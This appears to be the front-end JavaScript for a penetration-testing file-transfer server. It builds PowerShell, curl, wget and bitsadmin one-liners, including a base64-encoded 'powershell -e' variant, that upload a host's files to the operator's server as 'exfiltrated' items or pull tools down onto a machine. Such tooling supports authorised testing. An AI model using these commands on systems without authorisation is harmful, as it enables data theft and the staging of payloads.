(function() {
    const savedTheme = localStorage.getItem('pftp-theme') || 'dark';

    if (savedTheme === 'light') {
        document.documentElement.setAttribute('data-theme', 'light');
    }

    document.addEventListener('DOMContentLoaded', function() {
        const themeToggle = document.getElementById('themeToggle');

        if (themeToggle) {
            themeToggle.addEventListener('click', function() {
                const currentTheme = document.documentElement.getAttribute('data-theme');
                const newTheme = currentTheme === 'light' ? 'dark' : 'light';

                if (newTheme === 'light') {
                    document.documentElement.setAttribute('data-theme', 'light');
                } else {
                    document.documentElement.removeAttribute('data-theme');
                }

                localStorage.setItem('pftp-theme', newTheme);
            });
        }
    });
})();

function copyCommand(button) {
    const commandElement = button.previousElementSibling.querySelector('code');
    const command = commandElement.textContent;

    const textArea = document.createElement('textarea');
    textArea.value = command;
    textArea.style.position = 'fixed';
    textArea.style.opacity = '0';
    document.body.appendChild(textArea);
    textArea.select();

    let successful = false;
    try {
        successful = document.execCommand('copy');
    } catch (err) {
        console.error('Unable to copy', err);
    }

    document.body.removeChild(textArea);

    if (successful) {
        const originalHTML = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i>';
        button.style.background = '#22c55e';

        setTimeout(() => {
            button.innerHTML = originalHTML;
            button.style.background = '';
        }, 1500);
    } else {
        button.innerHTML = '<i class="fas fa-times"></i>';
        button.style.background = '#ef4444';

        setTimeout(() => {
            button.innerHTML = '<i class="fas fa-copy"></i>';
            button.style.background = '';
        }, 1500);
    }
}

document.getElementById('fileInput').addEventListener('change', function(e) {
    const fileName = e.target.files[0] ? e.target.files[0].name : 'No file selected';
    document.getElementById('fileNameDisplay').textContent = fileName;
});

document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => {
        const tabId = tab.getAttribute('data-tab');

        document.querySelectorAll('.tab-content').forEach(content => {
            content.classList.remove('active');
        });

        document.querySelectorAll('.tab').forEach(t => {
            t.classList.remove('active');
        });

        tab.classList.add('active');
        document.getElementById(tabId).classList.add('active');
    });
});

document.addEventListener('DOMContentLoaded', function() {
    const defaultVariant = 'powershell';

    document.querySelectorAll('.file-item').forEach(item => {
        initCommandTabs(item, defaultVariant);
    });

    document.addEventListener('click', function(e) {
        const tab = e.target.closest('.cmd-tab');
        if (!tab) return;

        const fileItem = tab.closest('.file-item');
        const cmdType = tab.getAttribute('data-cmd');
        switchCommandVariant(fileItem, cmdType);
    });
});

function initCommandTabs(fileItem, variant) {
    fileItem.querySelectorAll('.cmd-tab').forEach(tab => {
        tab.classList.toggle('active', tab.dataset.cmd === variant);
    });
    fileItem.querySelectorAll('.cmd-content').forEach(content => {
        content.classList.toggle('active', content.dataset.cmd === variant);
    });
    if (variant === 'base64') updateBase64Command(fileItem);
}

function switchCommandVariant(fileItem, cmdType) {
    fileItem.querySelectorAll('.cmd-tab').forEach(tab => {
        tab.classList.toggle('active', tab.dataset.cmd === cmdType);
    });
    fileItem.querySelectorAll('.cmd-content').forEach(content => {
        content.classList.toggle('active', content.dataset.cmd === cmdType);
    });
    if (cmdType === 'base64') updateBase64Command(fileItem);
}

function updateBase64Command(fileItem) {
    const base64Code = fileItem.querySelector('.cmd-content[data-cmd="base64"] code');
    const psCode = fileItem.querySelector('.cmd-content[data-cmd="powershell"] code');
    if (!base64Code || !psCode) return;

    const encoded = encodeToBase64PowerShell(psCode.textContent);
    base64Code.textContent = `powershell -e ${encoded}`;
}

function encodeToBase64PowerShell(command) {
    let utf16le = [];
    for (let i = 0; i < command.length; i++) {
        const code = command.charCodeAt(i);
        utf16le.push(code & 0xFF, (code >> 8) & 0xFF);
    }
    return btoa(String.fromCharCode.apply(null, utf16le));
}

document.getElementById('uploadForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const fileInput = document.getElementById('fileInput');
    const statusEl = document.getElementById('uploadStatus');

    if (!fileInput.files.length) {
        statusEl.className = 'upload-status upload-error';
        statusEl.style.display = 'block';
        statusEl.innerHTML = '<i class="fas fa-exclamation-circle"></i> Please select a file first';

        setTimeout(() => {
            statusEl.style.display = 'none';
        }, 3000);
        return;
    }

    statusEl.className = 'upload-status upload-success';
    statusEl.style.display = 'block';
    statusEl.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Uploading...';

    const formData = new FormData();
    formData.append('file', fileInput.files[0]);

    fetch('/upload', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.Status === 'File Uploaded successfully') {
            statusEl.className = 'upload-status upload-success';
            statusEl.innerHTML = `<i class="fas fa-check-circle"></i> ${data.filename} uploaded successfully`;

            // Reset file input
            fileInput.value = '';
            document.getElementById('fileNameDisplay').textContent = 'No file selected';

            // Refresh the uploaded files list
            refreshUploadedFiles();

            // Hide status after delay
            setTimeout(() => {
                statusEl.style.display = 'none';
            }, 3000);
        } else {
            statusEl.className = 'upload-status upload-error';
            statusEl.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${data.Status}`;

            setTimeout(() => {
                statusEl.style.display = 'none';
            }, 3000);
        }
    })
    .catch(error => {
        statusEl.className = 'upload-status upload-error';
        statusEl.innerHTML = '<i class="fas fa-exclamation-circle"></i> Upload failed: ' + error;

        setTimeout(() => {
            statusEl.style.display = 'none';
        }, 3000);
    });
});

const dropArea = document.querySelector('.file-input-container label');

['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
    dropArea.addEventListener(eventName, preventDefaults, false);
});

function preventDefaults(e) {
    e.preventDefault();
    e.stopPropagation();
}

['dragenter', 'dragover'].forEach(eventName => {
    dropArea.addEventListener(eventName, highlight, false);
});

['dragleave', 'drop'].forEach(eventName => {
    dropArea.addEventListener(eventName, unhighlight, false);
});

function highlight() {
    dropArea.style.background = 'rgba(14, 165, 233, 0.1)';
    dropArea.style.borderColor = '#0ea5e9';
}

function unhighlight() {
    dropArea.style.background = '';
    dropArea.style.borderColor = '';
}

dropArea.addEventListener('drop', handleDrop, false);

function handleDrop(e) {
    const dt = e.dataTransfer;
    const files = dt.files;
    const fileInput = document.getElementById('fileInput');

    fileInput.files = files;

    const fileName = files[0] ? files[0].name : 'No file selected';
    document.getElementById('fileNameDisplay').textContent = fileName;
}

document.addEventListener('DOMContentLoaded', function() {
    const searchInput = document.getElementById('toolSearch');
    const noResultsMessage = document.getElementById('noSearchResults');

    if (!searchInput || !noResultsMessage) return;

    function performSearch() {
        const searchTerm = searchInput.value.toLowerCase().trim();
        const fileItems = document.querySelectorAll('.file-item');
        let totalVisible = 0;

        fileItems.forEach(item => {
            const fileName = item.querySelector('.file-name').textContent.toLowerCase();

            if (fileName.includes(searchTerm) || searchTerm === '') {
                item.classList.remove('hidden');
                totalVisible++;
            } else {
                item.classList.add('hidden');
            }
        });

        document.querySelectorAll('.file-group').forEach(group => {
            const visibleFiles = group.querySelectorAll('.file-item:not(.hidden)').length;
            if (visibleFiles === 0) {
                group.classList.add('hidden');
            } else {
                group.classList.remove('hidden');
            }
        });

        if (totalVisible === 0 && searchTerm !== '') {
            noResultsMessage.classList.remove('hidden');
        } else {
            noResultsMessage.classList.add('hidden');
        }
    }

    searchInput.addEventListener('input', performSearch);

    const searchButton = document.querySelector('.search-button');
    if (searchButton) {
        searchButton.addEventListener('click', performSearch);
    }

    document.addEventListener('keydown', function(e) {
        if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
            e.preventDefault();
            searchInput.focus();
            searchInput.select();
        }

        if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
            e.preventDefault();
            searchInput.focus();
            searchInput.select();
        }

        if (e.key === 'Escape' && document.activeElement === searchInput) {
            searchInput.value = '';
            performSearch();
            searchInput.blur();
        }
    });
});

document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('.directory-header').forEach(header => {
        header.addEventListener('click', function() {
            const fileGroup = this.closest('.file-group');
            fileGroup.classList.toggle('collapsed');

            const directoryName = this.querySelector('h3 span').textContent;
            const isCollapsed = fileGroup.classList.contains('collapsed');
            localStorage.setItem('directory_' + directoryName, isCollapsed ? 'collapsed' : 'expanded');
        });
    });

    document.querySelectorAll('.file-group').forEach(fileGroup => {
        const directoryName = fileGroup.querySelector('.directory-header h3 span').textContent;
        const savedState = localStorage.getItem('directory_' + directoryName);

        if (savedState === 'collapsed') {
            fileGroup.classList.add('collapsed');
        }
    });
});

document.addEventListener('DOMContentLoaded', function() {
    const filePathInput = document.getElementById('ps-file-path');
    const serverUrlInput = document.getElementById('ps-server-url');
    const psCommandElement = document.getElementById('ps-upload-command');
    const linuxCommandElement = document.getElementById('linux-upload-command');
    const ipSelector = document.getElementById('ipSelector');

    if (!filePathInput || !serverUrlInput || !psCommandElement) return;

    function getSelectedIP() {
        return ipSelector ? ipSelector.value : 'localhost';
    }

    function getCurrentServerUrl() {
        const url = serverUrlInput.value.trim();
        if (url.includes('SELECTED_IP_PLACEHOLDER')) {
            return url.replace('SELECTED_IP_PLACEHOLDER', getSelectedIP());
        }
        return url;
    }

    const defaultFilePath = filePathInput.value.trim();
    let currentFilePath = defaultFilePath;

    function updateCommands() {
        const serverUrl = getCurrentServerUrl();

        const psCommand = `$File='${currentFilePath}'; $FilePath = Get-Item -Path $File; $URL = "${serverUrl}"; $fileBytes = [System.IO.File]::ReadAllBytes($FilePath); $fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes); $boundary = [System.Guid]::NewGuid().ToString(); $EOL = "\`r\`n"; $bodyLines = ( "--$boundary", "Content-Disposition: form-data; name=\`"file\`"; filename=\`"$File\`"", "Content-Type: application/octet-stream", "", $fileEnc, "--$boundary", "Content-Disposition: form-data; name=\`"filename\`"", "", $File, "--$boundary", "Content-Disposition: form-data; name=\`"apikey\`"", "", "abcd", "--$boundary--", "" ) -join $EOL; Invoke-RestMethod -Uri $URL -Method Post -ContentType "multipart/form-data; boundary=\`"$boundary\`"" -Body $bodyLines`;

        psCommandElement.textContent = psCommand;

        if (linuxCommandElement) {
            const linuxCommand = `curl -F "file=@${currentFilePath}" "${serverUrl}"`;
            linuxCommandElement.textContent = linuxCommand;
        }
    }

    window.updateUploadCommands = updateCommands;

    filePathInput.addEventListener('input', function() {
        currentFilePath = this.value.trim() || defaultFilePath;
        updateCommands();
    });

    serverUrlInput.addEventListener('input', function() {
        updateCommands();
    });

    filePathInput.addEventListener('blur', function() {
        if (!this.value.trim()) {
            this.value = defaultFilePath;
            currentFilePath = defaultFilePath;
            updateCommands();
        }
    });

    serverUrlInput.addEventListener('blur', function() {
        if (!this.value.trim()) {
            const protocol = window.location.protocol.replace(':', '') || 'http';
            const port = serverUrlInput.getAttribute('data-port') || '1234';
            serverUrlInput.value = `${protocol}://${getSelectedIP()}:${port}/upload`;
            updateCommands();
        }
    });

    updateCommands();
});

document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('.delete-btn').forEach(button => {
        button.addEventListener('click', function() {
            const filename = this.getAttribute('data-filename');
            showDeleteConfirmation(filename);
        });
    });

    const refreshButton = document.getElementById('refreshTools');
    if (refreshButton) {
        refreshButton.addEventListener('click', refreshTools);
    }

    setInterval(refreshTools, 300000);
});

function showDeleteConfirmation(filename) {
    const dialog = document.createElement('div');
    dialog.className = 'confirm-dialog';

    const content = document.createElement('div');
    content.className = 'confirm-dialog-content';

    content.innerHTML = `
        <h3><i class="fas fa-exclamation-triangle"></i> Delete File</h3>
        <p>Are you sure you want to delete "${filename}"?</p>
        <p>This action cannot be undone.</p>
        <div class="confirm-dialog-buttons">
            <button class="btn btn-cancel">Cancel</button>
            <button class="btn btn-delete">Delete</button>
        </div>
    `;

    dialog.appendChild(content);
    document.body.appendChild(dialog);

    const cancelButton = content.querySelector('.btn-cancel');
    const deleteButton = content.querySelector('.btn-delete');

    cancelButton.addEventListener('click', function() {
        document.body.removeChild(dialog);
    });

    deleteButton.addEventListener('click', function() {
        deleteFile(filename);
        document.body.removeChild(dialog);
    });
}

function deleteFile(filename) {
    fetch('/api/delete-file', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ filename: filename })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            const fileElements = document.querySelectorAll('.file-item');
            fileElements.forEach(el => {
                const nameEl = el.querySelector('.file-name');
                if (nameEl && nameEl.textContent === filename) {
                    el.remove();
                }
            });
            showNotification('File deleted successfully', 'success');
        } else {
            showNotification('Error: ' + data.message, 'error');
        }
    })
    .catch(error => {
        showNotification('Error deleting file: ' + error, 'error');
    });
}

function refreshTools() {
    const refreshButton = document.getElementById('refreshTools');
    const toolsContainer = document.getElementById('tools-tab');

    if (!refreshButton || !toolsContainer) return;

    refreshButton.classList.add('refreshing');

    fetch('/api/check-tools-update')
        .then(response => response.json())
        .then(data => {
            updateToolsUI(data);
        })
        .catch(error => {
            console.error('Error refreshing tools:', error);
        })
        .finally(() => {
            refreshButton.classList.remove('refreshing');
        });
}

function refreshUploadedFiles() {
    const container = document.getElementById('uploadedFilesList');
    if (!container) return;

    fetch('/api/uploaded-files')
        .then(response => response.json())
        .then(files => {
            if (files.length === 0) {
                container.innerHTML = `
                    <div class="no-files">
                        <i class="fas fa-info-circle"></i>
                        <p>No files have been exfiltrated yet.</p>
                    </div>
                `;
                return;
            }

            const ipSelector = document.getElementById('ipSelector');
            const selectedIP = ipSelector ? ipSelector.value : 'localhost';
            const port = window.location.port || '1234';

            container.innerHTML = files.map(file => {
                const urlPath = `uploads/${file.name}`;
                return `
                <div class="file-item">
                    <div class="file-header">
                        <i class="file-icon fas fa-file-alt"></i>
                        <div class="file-name">${file.name}</div>
                        <div class="file-info">
                            <span><i class="fas fa-weight-hanging"></i> ${file.size}</span>
                            <span><i class="fas fa-clock"></i> ${file.date}</span>
                            <span class="source-ip"><i class="fas fa-network-wired"></i> ${file.source_ip}</span>
                        </div>
                        <a href="http://${selectedIP}:${port}/uploads/${file.name}" class="download-btn" download="${file.name}" title="Download">
                            <i class="fas fa-download"></i>
                        </a>
                        <button class="delete-btn" data-filename="${file.name}" title="Delete file">
                            <i class="fas fa-trash-alt"></i>
                        </button>
                    </div>
                    <div class="command-tabs">
                        <div class="cmd-tab active" data-cmd="powershell"><i class="fab fa-windows"></i> PS</div>
                        <div class="cmd-tab" data-cmd="wget"><i class="fab fa-linux"></i> wget</div>
                        <div class="cmd-tab" data-cmd="curl"><i class="fab fa-linux"></i> curl</div>
                        <div class="cmd-tab" data-cmd="bitsadmin"><i class="fab fa-windows"></i> bits</div>
                        <div class="cmd-tab" data-cmd="base64"><i class="fas fa-lock"></i> B64</div>
                    </div>
                    <div class="command-box cmd-content active" data-cmd="powershell">
                        <div class="command-content"><code>iwr -Uri "http://${selectedIP}:${port}/${urlPath}" -OutFile "${file.name}"</code></div>
                        <button class="copy-btn" onclick="copyCommand(this)"><i class="fas fa-copy"></i></button>
                    </div>
                    <div class="command-box cmd-content" data-cmd="wget">
                        <div class="command-content"><code>wget -O "${file.name}" "http://${selectedIP}:${port}/${urlPath}"</code></div>
                        <button class="copy-btn" onclick="copyCommand(this)"><i class="fas fa-copy"></i></button>
                    </div>
                    <div class="command-box cmd-content" data-cmd="curl">
                        <div class="command-content"><code>curl -o "${file.name}" "http://${selectedIP}:${port}/${urlPath}"</code></div>
                        <button class="copy-btn" onclick="copyCommand(this)"><i class="fas fa-copy"></i></button>
                    </div>
                    <div class="command-box cmd-content" data-cmd="bitsadmin">
                        <div class="command-content"><code>bitsadmin /transfer j /download /priority high "http://${selectedIP}:${port}/${urlPath}" "$PWD\\${file.name}"</code></div>
                        <button class="copy-btn" onclick="copyCommand(this)"><i class="fas fa-copy"></i></button>
                    </div>
                    <div class="command-box cmd-content" data-cmd="base64">
                        <div class="command-content"><code>powershell -e [generated]</code></div>
                        <button class="copy-btn" onclick="copyCommand(this)"><i class="fas fa-copy"></i></button>
                    </div>
                </div>
            `}).join('');

            // Re-attach delete button handlers
            container.querySelectorAll('.delete-btn').forEach(button => {
                button.addEventListener('click', function() {
                    const filename = this.getAttribute('data-filename');
                    showDeleteConfirmation(filename);
                });
            });

            // Initialize command tabs for new file items
            container.querySelectorAll('.file-item').forEach(item => {
                initCommandTabs(item, 'powershell');
            });
        })
        .catch(error => {
            console.error('Error refreshing uploaded files:', error);
        });
}

function updateToolsUI(toolsData) {
    showNotification('Tools refreshed', 'info');
}

function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.innerHTML = `
        <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-exclamation-circle' : 'fa-info-circle'}"></i>
        <span>${message}</span>
    `;

    document.body.appendChild(notification);

    setTimeout(() => {
        notification.classList.add('show');
    }, 10);

    setTimeout(() => {
        notification.classList.remove('show');
        setTimeout(() => {
            document.body.removeChild(notification);
        }, 300);
    }, 3000);
}

document.addEventListener('DOMContentLoaded', function() {
    const ipSelector = document.getElementById('ipSelector');
    if (!ipSelector) return;

    let selectedIP = ipSelector.value;

    updateAllURLs(selectedIP);

    const serverUrlInput = document.getElementById('ps-server-url');
    if (serverUrlInput && serverUrlInput.value.includes('SELECTED_IP_PLACEHOLDER')) {
        serverUrlInput.value = serverUrlInput.value.replace('SELECTED_IP_PLACEHOLDER', selectedIP);
    }

    if (window.updateUploadCommands) {
        window.updateUploadCommands();
    }

    ipSelector.addEventListener('change', function() {
        selectedIP = this.value;
        updateAllURLs(selectedIP);

        if (serverUrlInput) {
            const currentUrl = serverUrlInput.value;
            const protocol = currentUrl.split('://')[0];
            const portMatch = currentUrl.match(/:(\d+)/);
            const port = portMatch ? portMatch[1] : '1234';
            const path = currentUrl.split('/').slice(3).join('/');
            serverUrlInput.value = `${protocol}://${selectedIP}:${port}/${path}`;

            if (window.updateUploadCommands) {
                window.updateUploadCommands();
            }
        }
    });

    function updateAllURLs(newIP) {
        document.querySelectorAll('code').forEach(codeElement => {
            let command = codeElement.textContent;
            command = command.replace(/SELECTED_IP_PLACEHOLDER/g, newIP);
            command = command.replace(/(https?:\/\/)[^:\/\s]+:/g, `$1${newIP}:`);
            codeElement.textContent = command;
        });

        document.querySelectorAll('.download-btn').forEach(btn => {
            let href = btn.getAttribute('href');
            if (href) {
                href = href.replace(/SELECTED_IP_PLACEHOLDER/g, newIP);
                href = href.replace(/(https?:\/\/)[^:\/\s]+:/g, `$1${newIP}:`);
                btn.setAttribute('href', href);
            }
        });

        const serverAddress = document.getElementById('serverAddress');
        if (serverAddress) {
            const currentText = serverAddress.textContent;
            const protocol = currentText.split('://')[0];
            const port = currentText.split(':').pop();
            serverAddress.textContent = `${protocol}://${newIP}:${port}`;
        }

        document.querySelectorAll('.file-item').forEach(item => {
            updateBase64Command(item);
        });
    }
});

document.addEventListener('DOMContentLoaded', function() {
    const logContainer = document.getElementById('logContainer');
    const logEmpty = document.getElementById('logEmpty');
    const logStatus = document.getElementById('logStatus');
    const clearLogsBtn = document.getElementById('clearLogs');

    if (!logContainer) return;

    let eventSource = null;
    let logCount = 0;

    const actionConfig = {
        'DOWNLOAD': { icon: 'fa-download', color: 'log-download', toastColor: 'download', label: 'File Downloaded' },
        'UPLOAD': { icon: 'fa-upload', color: 'log-upload', toastColor: 'upload', label: 'File Uploaded' },
        'DELETE': { icon: 'fa-trash-alt', color: 'log-delete', toastColor: 'delete', label: 'File Deleted' }
    };

    function createLogEntry(entry) {
        const config = actionConfig[entry.action] || { icon: 'fa-circle', color: '' };
        const div = document.createElement('div');
        div.className = `log-entry ${config.color}`;
        div.innerHTML = `
            <span class="log-time">${entry.timestamp}</span>
            <span class="log-action"><i class="fas ${config.icon}"></i> ${entry.action}</span>
            <span class="log-file">${entry.filename}</span>
            <span class="log-ip">${entry.ip}</span>
            ${entry.details ? `<span class="log-details">${entry.details}</span>` : ''}
        `;
        return div;
    }

    function showActivityToast(entry) {
        const config = actionConfig[entry.action] || { icon: 'fa-circle', toastColor: '', label: 'Activity' };

        const toast = document.createElement('div');
        toast.className = `activity-toast ${config.toastColor}`;
        toast.innerHTML = `
            <i class="fas ${config.icon}"></i>
            <div class="toast-content">
                <span class="toast-action">${config.label}</span>
                <span class="toast-file">${entry.filename} (${entry.ip})</span>
            </div>
        `;

        document.body.appendChild(toast);
        setTimeout(() => toast.classList.add('show'), 10);

        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => toast.remove(), 300);
        }, 3000);
    }

    function addLogEntry(entry, showToast = true) {
        if (logEmpty) logEmpty.style.display = 'none';
        const logEntry = createLogEntry(entry);
        logContainer.insertBefore(logEntry, logContainer.firstChild);
        logCount++;

        while (logContainer.children.length > 101) {
            logContainer.removeChild(logContainer.lastChild);
        }

        if (showToast) {
            showActivityToast(entry);
        }
    }

    function updateStatus(connected) {
        if (!logStatus) return;
        if (connected) {
            logStatus.innerHTML = '<i class="fas fa-circle connected"></i><span>Live</span>';
            logStatus.classList.add('connected');
        } else {
            logStatus.innerHTML = '<i class="fas fa-circle"></i><span>Connecting...</span>';
            logStatus.classList.remove('connected');
        }
    }

    function connectSSE() {
        if (eventSource) {
            eventSource.close();
        }

        eventSource = new EventSource('/api/activity-stream');

        eventSource.onopen = function() {
            updateStatus(true);
        };

        eventSource.onmessage = function(event) {
            try {
                const data = JSON.parse(event.data);
                if (data.type === 'connected') {
                    fetchLogHistory();
                } else if (data.action) {
                    addLogEntry(data);
                }
            } catch (e) {
                console.error('Error parsing SSE data:', e);
            }
        };

        eventSource.onerror = function() {
            updateStatus(false);
            setTimeout(connectSSE, 3000);
        };
    }

    function fetchLogHistory() {
        fetch('/api/activity-log')
            .then(response => response.json())
            .then(logs => {
                const entries = logContainer.querySelectorAll('.log-entry');
                entries.forEach(e => e.remove());
                logCount = 0;

                if (logs.length === 0) {
                    if (logEmpty) logEmpty.style.display = 'flex';
                } else {
                    if (logEmpty) logEmpty.style.display = 'none';
                    logs.forEach(log => {
                        addLogEntry(log, false);
                    });
                }
            })
            .catch(err => console.error('Error fetching log history:', err));
    }

    if (clearLogsBtn) {
        clearLogsBtn.addEventListener('click', function() {
            const entries = logContainer.querySelectorAll('.log-entry');
            entries.forEach(e => e.remove());
            logCount = 0;
            if (logEmpty) logEmpty.style.display = 'flex';
        });
    }

    connectSSE();

    window.addEventListener('beforeunload', function() {
        if (eventSource) {
            eventSource.close();
        }
    });
});
